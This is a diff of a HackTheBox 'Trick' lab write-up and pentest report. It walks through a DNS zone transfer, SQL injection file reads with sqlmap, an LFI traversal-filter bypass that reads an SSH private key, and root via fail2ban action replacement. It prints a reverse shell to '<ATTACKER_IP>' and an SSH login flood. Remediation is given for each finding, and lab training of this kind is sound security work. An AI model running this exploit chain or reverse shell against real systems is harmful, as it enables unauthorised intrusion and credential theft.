@@ -1,75 +1,411 @@
-# Trick | HackTheBox
+# Trick
 
-**Report ID:** HTB-TRK-01  
-**Date:** 23 October 2026  
-**Platform:** HackTheBox  
-**OS:** Debian GNU/Linux 10 (buster)
+**Platform:** HackTheBox
+**OS:** Linux
+**Tags:** DNS, Zone Transfer, SQLi, FILE Read, LFI, Filter Bypass, fail2ban
+**Date:** 2026-10-23
 
----
+DNS zone transfer exposes a payroll subdomain via misconfigured BIND. SQL injection on the login form with MySQL FILE privilege reads the nginx config off disk, revealing a second vhost not in DNS. That vhost has an LFI filtered by a non-recursive str_replace. Nesting the traversal defeats it and reads michael's SSH key. Root comes from michael's membership in the security group, which can write the fail2ban action directory, combined with a passwordless sudo rule to restart the service.
 
-## Attack Path
+## 1. Enumeration
 
-DNS zone transfer (misconfigured `allow-transfer { any; }`) reveals `preprod-payroll.trick.htb`. SQL injection on the login endpoint with MySQL `FILE` privilege reads the nginx config off disk, exposing a second vhost not in DNS. That vhost has a PHP LFI filtered by a non-recursive `str_replace`. Nesting the traversal defeats the filter, reads michael's SSH key, and lands a shell. Michael is in the `security` group with write access to the fail2ban action directory and passwordless sudo to restart the service. Replacing `actionban` with a reverse shell and flooding SSH with failed logins triggers the ban and executes as root.
+```bash
+nmap -sV -sC -p- <TARGET_IP>
+```
 
----
+```
+22/tcp  open  ssh    OpenSSH 7.9p1 Debian
+25/tcp  open  smtp   Postfix smtpd
+53/tcp  open  domain ISC BIND 9.11.5-P4
+80/tcp  open  http   nginx 1.14.2
+```
 
-## Findings
+Port 53 is open on TCP. A UDP-only DNS server does not respond to zone transfers. TCP means AXFR is worth trying. Port 80 serves a static "Coming Soon" page with nothing on it.
 
-| ID | Title | Severity | CVSS |
-|----|-------|----------|------|
-| F-01 | DNS Zone Transfer Unrestricted | Medium | 5.3 |
-| F-02 | SQL Injection with FILE Privilege | Critical | 9.8 |
-| F-03 | Non-Recursive LFI Filter Bypass | High | 8.1 |
-| F-04 | fail2ban Group Write + Passwordless Sudo Restart | High | 7.8 |
+## 2. DNS Enumeration
 
----
+Find the domain by asking the box's own resolver for a reverse PTR on itself:
 
-## F-01: DNS Zone Transfer Unrestricted
+```bash
+dig -x <TARGET_IP> @<TARGET_IP>
+```
 
-**Severity:** Medium | **CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
+```
+;; ANSWER SECTION:
+80.79.129.10.in-addr.arpa. 604800 IN PTR trick.htb.
+```
 
-ISC BIND is configured with `allow-transfer { any; };`, allowing any host to request a full copy of the zone. A single `dig axfr` call returns all DNS records including `preprod-payroll.trick.htb`, a subdomain not otherwise discoverable.
+Domain is `trick.htb`. Zone transfer:
 
-**Remediation:** Restrict zone transfers to authorised secondary nameserver IPs only: `allow-transfer { <secondary-ns-ip>; };`. Audit all DNS zones for records that expose internal infrastructure.
+```bash
+dig axfr trick.htb @<TARGET_IP>
+```
 
----
+```
+trick.htb.                 604800 IN SOA   trick.htb. root.trick.htb. ...
+trick.htb.                 604800 IN A     <TARGET_IP>
+preprod-payroll.trick.htb. 604800 IN A     <TARGET_IP>
+root.trick.htb.            604800 IN A     <TARGET_IP>
+```
 
-## F-02: SQL Injection with FILE Privilege
+`allow-transfer` is set to `any`. The subdomain `preprod-payroll.trick.htb` is exposed. Added both to `/etc/hosts`.
 
-**Severity:** Critical | **CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+## 3. SQL Injection — preprod-payroll
 
-The login endpoint at `ajax.php?action=login` interpolates the `username` parameter directly into a SQL query without parameterisation. The database user `remo@localhost` holds MySQL `FILE` privilege. This allows unauthenticated login bypass and arbitrary file read via `LOAD_FILE()`. The nginx server configuration was read to discover an undocumented vhost.
+The app is an Employee Payroll Management System. The login form submits via JavaScript to `ajax.php?action=login`. Testing a single quote in the username:
 
-**PoC:**
 ```bash
 curl -s -X POST 'http://preprod-payroll.trick.htb/ajax.php?action=login' \
-  -d "username=admin'-- -&password=x"
+  -d "username=admin'&password=admin"
+```
+
+```
+Notice: Trying to get property 'num_rows' of non-object in /var/www/payroll/admin_class.php on line 21
+```
+
+SQL error confirms injection. Running sqlmap:
+
+```bash
+sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' \
+  --data 'username=admin&password=admin' -p username \
+  --batch --level 3 --risk 3 --current-user --privileges
+```
+
+```
+current user: 'remo@localhost'
+privilege: FILE
+```
+
+`FILE` privilege means sqlmap can pull arbitrary files off disk. Reading `/etc/passwd` shows only one user with a login shell: `michael`. Reading the nginx config:
+
+```bash
 sqlmap ... --file-read=/etc/nginx/sites-enabled/default
 ```
 
-**Remediation:** Use prepared statements with parameterised queries throughout. Revoke `FILE` privilege from all application database users. Apply the principle of least privilege: the web application user should only have SELECT/INSERT/UPDATE on the tables it requires.
+```
+server_name preprod-marketing.trick.htb;
+root /var/www/market;
+fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
+```
 
----
+A second vhost not in DNS. PHP runs through michael's FPM socket, so file access through this vhost happens as michael. Added to `/etc/hosts`.
 
-## F-03: Non-Recursive LFI Filter Bypass
+## 4. LFI Filter Bypass — preprod-marketing
 
-**Severity:** High | **CVSS:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+Reading the PHP source via the FILE SQLi:
 
-`index.php` on `preprod-marketing.trick.htb` passes the `page` GET parameter to `include()` after a single call to `str_replace("../", "", $file)`. The filter runs once and never re-checks the result. Using `....//` as the traversal unit produces `../` after the replacement, defeating the filter entirely. Because PHP runs as michael via a dedicated FPM socket, any file readable by michael can be exfiltrated, including the SSH private key at `/home/michael/.ssh/id_rsa`.
+```bash
+sqlmap ... --file-read=/var/www/market/index.php
+```
 
-**PoC:**
+```php
+$file = $_GET['page'];
+include("/var/www/market/" . str_replace("../", "", $file));
+```
+
+The filter runs `str_replace("../", "", $file)` once, non-recursively. Using `....//` as the traversal unit produces `../` after the removal:
+
+```bash
+php -r 'echo str_replace("../","","....//"), "\n";'
+# ../
+```
+
+Chaining three reaches root. Grabbing michael's private key:
+
 ```bash
 curl -s 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa'
 ```
 
-**Remediation:** Do not implement path traversal filtering with string replacement. Use `basename()` or `realpath()` to resolve the final path and verify it falls within the intended document root before including it. Disable `allow_url_include` in `php.ini`. SSH private keys should not be readable by web-facing service accounts.
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa michael@<TARGET_IP>
+```
+
+```
+michael@trick:~$ cat user.txt
+redacted
+```
+
+## 5. Privilege Escalation — fail2ban
+
+```bash
+id
+sudo -l
+```
+
+```
+uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
+
+(root) NOPASSWD: /etc/init.d/fail2ban restart
+```
+
+```bash
+ls -la /etc/fail2ban/action.d/
+```
+
+```
+drwxrwx--- root security  action.d/
+```
+
+fail2ban runs as root. Michael is in `security`, which owns `action.d/` with write permission. The files inside are root-owned but directory write permission lets you replace them. Move the original and copy it back to take ownership:
+
+```bash
+cd /etc/fail2ban/action.d
+mv iptables-multiport.conf iptables-multiport.conf.bak
+cp iptables-multiport.conf.bak iptables-multiport.conf
+```
+
+Create the payload:
+
+```bash
+cat > /tmp/shell.sh <<'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+EOF
+chmod +x /tmp/shell.sh
+```
+
+Edit `iptables-multiport.conf` and replace `actionban`:
+
+```
+actionban = /tmp/shell.sh
+```
+
+Reload and trigger the sshd jail:
+
+```bash
+sudo /etc/init.d/fail2ban restart
+
+for i in $(seq 1 8); do
+  sshpass -p wrong ssh -o StrictHostKeyChecking=no \
+    -o PubkeyAuthentication=no fakeuser@<TARGET_IP> 2>/dev/null
+done
+```
+
+Root shell lands on the listener.
+
+```
+root@trick:~# cat /root/root.txt
+redacted
+```
+
+## 6. Flags
+
+- User: `redacted`
+- Root: `redacted`
 
 ---
 
-## F-04: fail2ban Group Write + Passwordless Sudo Restart
+## Penetration Test Report
 
-**Severity:** High | **CVSS:** 7.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+**Target:** trick.htb
+**Assessment type:** External network & web application assessment
+**Assessment date:** 23 October 2026
+**Environment:** HackTheBox laboratory assessment  |  Linux
+**Prepared by:** Ledion Mujaj
+**Reference:** HTB-TRK-01
 
-The `security` group has write permission on `/etc/fail2ban/action.d/`. The `michael` user is a member of this group. The action config files themselves are root-owned, but directory write permission allows replacing files. An attacker copies the action file to gain ownership, replaces `actionban` with an arbitrary command, then uses passwordless sudo (`NOPASSWD: /etc/init.d/fail2ban restart`) to reload the service as root. Flooding the SSH daemon with failed login attempts triggers the ban action, executing the payload as root.
+---
 
-**Remediation:** Remove michael from the `security` group. Make `action.d/` readable but not writable by any non-root user. Replace the NOPASSWD sudo rule with a more restricted mechanism or remove it entirely. Audit all sudoers entries that allow service restarts without a password, especially for services with action or script directories writable by non-root users.
+## 1. Executive Summary
+
+Testing of **trick.htb** identified four findings that together produced full root compromise from an unauthenticated external position. BIND DNS was configured with unrestricted zone transfers, exposing a payroll subdomain not otherwise discoverable. The payroll application contained a SQL injection on its login endpoint, and the database user held MySQL `FILE` privilege. This allowed arbitrary file read without authentication, used to extract the nginx server configuration and discover a second internal vhost. That vhost contained a local file inclusion filtered by a non-recursive `str_replace`. Nesting the path traversal sequence defeated the filter and exposed michael's SSH private key, producing a shell. Privilege escalation came from group write access to the fail2ban action directory combined with a passwordless sudo rule to restart the service as root.
+
+**Priority recommendations:**
+
+1. Restrict DNS zone transfers to authorised secondary nameserver IPs only.
+2. Replace all SQL string concatenation with parameterised queries. Revoke `FILE` privilege from all web application database users.
+3. Replace the LFI filter with proper path validation using `realpath()` and a document root check.
+4. Remove michael from the `security` group. Restrict write access to `action.d/` to root only. Remove the NOPASSWD sudo rule.
+
+---
+
+## 2. Assessment Scope and Methodology
+
+| Asset | Address | Description |
+|-------|---------|-------------|
+| trick.htb | <TARGET_IP> | Debian 10 Linux; DNS on 53, HTTP on 80, SSH on 22. |
+
+| Port | Service | Observed detail |
+|------|---------|----------------|
+| 22/tcp | SSH | OpenSSH 7.9p1 Debian |
+| 53/tcp | DNS | ISC BIND 9.11.5-P4, TCP open |
+| 80/tcp | HTTP | nginx 1.14.2, static placeholder |
+
+Testing began with a full port scan. DNS zone transfer was attempted and succeeded, revealing `preprod-payroll.trick.htb`. SQL injection was identified on the payroll login endpoint and exploited with sqlmap to enumerate the database user privileges and read files from disk. The nginx configuration disclosed a second vhost, `preprod-marketing.trick.htb`. The LFI on that vhost was identified by reading the PHP source and exploited via a non-recursive filter bypass. Michael's SSH private key was extracted and used to authenticate. Post-foothold enumeration identified the fail2ban group write misconfiguration and passwordless sudo rule, which were chained to obtain a root shell.
+
+---
+
+## 3. Results Overview
+
+| Reference | Finding | Severity |
+|-----------|---------|----------|
+| F-01 | DNS Zone Transfer Unrestricted | **Medium** |
+| F-02 | SQL Injection with FILE Privilege | **Critical** |
+| F-03 | Non-Recursive LFI Filter Bypass | **High** |
+| F-04 | fail2ban Group Write + Passwordless Sudo Restart | **High** |
+
+**Compromise sequence:**
+
+| Stage | Action | Access obtained |
+|-------|--------|----------------|
+| 01 | Zone transfer revealed `preprod-payroll.trick.htb`. SQLi on login endpoint with FILE privilege read nginx config, exposing second vhost. | Filesystem read as MySQL |
+| 02 | LFI filter bypass on `preprod-marketing.trick.htb` read michael's SSH private key. | SSH shell as `michael` |
+| 03 | Security group write access to fail2ban action directory. Replaced `actionban`, restarted service via NOPASSWD sudo, triggered sshd jail. | Root shell |
+
+---
+
+## 4.1 DNS Zone Transfer Unrestricted
+
+### F-01   BIND 9.11.5-P4 -- allow-transfer { any; } -- MEDIUM
+
+| Field | Detail |
+|-------|--------|
+| Description | The BIND DNS server is configured with `allow-transfer { any; };`, permitting any host to request a full zone copy via AXFR. This exposed `preprod-payroll.trick.htb`, a subdomain not otherwise discoverable without active vhost fuzzing. |
+| Prerequisites | Network access to TCP port 53. No credentials required. |
+| Impact | Full DNS zone enumeration. Internal hostnames, subdomains and infrastructure exposed to any external party. |
+| Affected system | trick.htb port 53/tcp -- ISC BIND 9.11.5-P4 |
+| CVSS 3.1 | 5.3 -- AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N |
+| CWE | CWE-200: Exposure of Sensitive Information |
+
+**Steps to reproduce:**
+
+1. `dig -x <TARGET_IP> @<TARGET_IP>` to retrieve the domain name.
+2. `dig axfr trick.htb @<TARGET_IP>` to dump the full zone.
+
+**Evidence:**
+
+```
+$ dig axfr trick.htb @<TARGET_IP>
+preprod-payroll.trick.htb. 604800 IN A <TARGET_IP>
+```
+
+**Remediation:** Set `allow-transfer { none; };` globally in the BIND options block. Permit transfers only to authorised secondary nameserver IPs per zone. Audit all DNS zones for records exposing internal infrastructure.
+
+**Verification:** Confirm `dig axfr trick.htb @<TARGET_IP>` returns `Transfer failed` or is refused with NOTAUTH.
+
+---
+
+## 4.2 SQL Injection with FILE Privilege
+
+### F-02   ajax.php -- username parameter -- CRITICAL
+
+| Field | Detail |
+|-------|--------|
+| Description | The `username` POST parameter on `ajax.php?action=login` is concatenated directly into a SQL query without parameterisation. The database user `remo@localhost` holds MySQL `FILE` privilege, enabling `LOAD_FILE()` reads of arbitrary disk files accessible to the MySQL process. |
+| Prerequisites | Network access to port 80. No credentials required. |
+| Impact | Unauthenticated authentication bypass and arbitrary file read. Used to extract the nginx server configuration and discover a second internal vhost. |
+| Affected system | preprod-payroll.trick.htb -- `/var/www/payroll/admin_class.php` |
+| CVSS 3.1 | 9.8 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-89: SQL Injection |
+
+**Steps to reproduce:**
+
+1. Confirm injection: `curl -s -X POST '.../ajax.php?action=login' -d "username=admin'&password=x"` produces a SQL error.
+2. Run sqlmap with `--current-user --privileges` to confirm FILE privilege.
+3. Run sqlmap with `--file-read=/etc/nginx/sites-enabled/default` to extract the nginx config.
+
+**Evidence:**
+
+```
+current user: 'remo@localhost'
+privilege: FILE
+
+[extracted nginx config]
+server_name preprod-marketing.trick.htb;
+fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
+```
+
+**Remediation:** Use PDO prepared statements with parameterised queries throughout. Revoke `FILE` privilege from the application database user. The web application user should hold only SELECT, INSERT, UPDATE, DELETE on the specific tables it requires.
+
+**Verification:** Confirm a single quote in the username no longer produces a SQL error. Confirm `remo@localhost` no longer holds FILE privilege.
+
+---
+
+## 4.3 Non-Recursive LFI Filter Bypass
+
+### F-03   index.php -- page parameter -- HIGH
+
+| Field | Detail |
+|-------|--------|
+| Description | The `page` GET parameter on `index.php` is passed to `include()` after a single non-recursive call to `str_replace("../", "", $file)`. Using `....//` as the traversal unit produces `../` after the removal, defeating the filter. PHP runs as michael via a dedicated FPM socket, so any file readable by michael is accessible. |
+| Prerequisites | Network access to port 80 and knowledge of the vhost (obtained via F-02). No credentials required. |
+| Impact | Unauthenticated read of any file accessible to michael, including the SSH private key. |
+| Affected system | preprod-marketing.trick.htb -- `/var/www/market/index.php` |
+| CVSS 3.1 | 8.1 -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
+| CWE | CWE-22: Path Traversal |
+
+**Steps to reproduce:**
+
+1. Confirm filter: `php -r 'echo str_replace("../","","....//"), "\n";'` outputs `../`.
+2. `curl -s 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa'`
+3. Save key, `chmod 600`, and SSH in as michael.
+
+**Evidence:**
+
+```
+$ curl -s 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa'
+-----BEGIN OPENSSH PRIVATE KEY-----
+[key data]
+-----END OPENSSH PRIVATE KEY-----
+
+michael@trick:~$
+```
+
+**Remediation:** Use `realpath()` to resolve the canonical path and verify it falls within the document root before passing to `include()`. Set `open_basedir` in `php.ini`. The FPM socket should run as a dedicated account with no home directory or SSH credentials.
+
+**Verification:** Confirm `....//` traversal no longer resolves outside `/var/www/market/`. Confirm PHP cannot read files outside `open_basedir`.
+
+---
+
+## 4.4 fail2ban Group Write + Passwordless Sudo Restart
+
+### F-04   action.d/ -- security group + NOPASSWD sudo -- HIGH
+
+| Field | Detail |
+|-------|--------|
+| Description | The `security` group has write permission on `/etc/fail2ban/action.d/`. Michael is a member. Although action config files are root-owned, directory write permission allows replacing them. An attacker copies the config to gain ownership, replaces `actionban` with an arbitrary command, then uses NOPASSWD sudo to reload fail2ban as root. Triggering the sshd jail executes the action as root. |
+| Prerequisites | Local shell access as michael. |
+| Impact | Local privilege escalation to root via arbitrary command execution as the fail2ban service. |
+| Affected system | trick.htb -- `/etc/fail2ban/action.d/`, sudoers rule for `fail2ban restart` |
+| CVSS 3.1 | 7.8 -- AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
+| CWE | CWE-732: Incorrect Permission Assignment for Critical Resource |
+
+**Steps to reproduce:**
+
+1. `mv /etc/fail2ban/action.d/iptables-multiport.conf{,.bak} && cp /etc/fail2ban/action.d/iptables-multiport.conf{.bak,}`
+2. Edit `actionban` to run `/tmp/shell.sh` (a reverse shell script).
+3. `sudo /etc/init.d/fail2ban restart`
+4. Flood SSH: `for i in $(seq 1 8); do sshpass -p x ssh fakeuser@<TARGET_IP> 2>/dev/null; done`
+5. Root shell lands on listener.
+
+**Evidence:**
+
+```
+$ id
+uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
+
+$ sudo -l
+(root) NOPASSWD: /etc/init.d/fail2ban restart
+
+# after triggering ban:
+root@trick:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Remediation:** Remove michael from the `security` group. Set `action.d/` to root:root with mode 750. Remove the NOPASSWD sudo rule for the fail2ban restart. Audit all sudoers entries where the service reads from a directory writable by the sudo-granted user.
+
+**Verification:** Confirm michael is not in the `security` group. Confirm `action.d/` is not writable by non-root users. Confirm `sudo /etc/init.d/fail2ban restart` prompts for a password.
+
+---
+
+## 5. Remediation and Assessment Closeout
+
+| Priority | Action | Reference |
+|----------|--------|-----------|
+| Critical | Parameterise all SQL queries; revoke FILE privilege from web application DB user. | F-02 |
+| High | Replace LFI filter with realpath validation; set open_basedir; isolate FPM user. | F-03 |
+| High | Remove michael from security group; restrict action.d to root; remove NOPASSWD rule. | F-04 |
+| Medium | Set `allow-transfer { none; };` in BIND; permit only authorised secondary NS IPs. | F-01 |
+
+**Test artefacts:** `/tmp/shell.sh` and the modified `iptables-multiport.conf` were created during exploitation. Both should be confirmed removed and the original config restored.
